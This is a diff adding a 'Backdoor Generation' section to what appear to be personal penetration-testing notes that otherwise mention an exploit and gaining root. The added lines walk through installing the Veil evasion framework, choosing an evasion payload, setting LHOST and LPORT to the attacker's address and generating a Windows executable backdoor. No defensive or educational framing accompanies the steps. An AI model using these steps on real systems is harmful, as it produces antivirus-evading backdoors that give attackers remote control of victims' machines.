@@ -162,3 +162,35 @@ exploit
 
 get root access
 
+## Backdoor Generation
+
+### Veil Framework Installation
+
+```console
+https://github.com/Veil-Framework/Veil.git
+```
+
+```
+./config/setup.sh --force --silent
+```
+
+```
+python3 Veil.py
+```
+
+use 1 evasion
+
+use 14
+
+Set options like LHOST or LPORT to your own ip address for backdoor application
+
+generate
+
+will create exe for you.
+
+
+### 
+
+
+
+
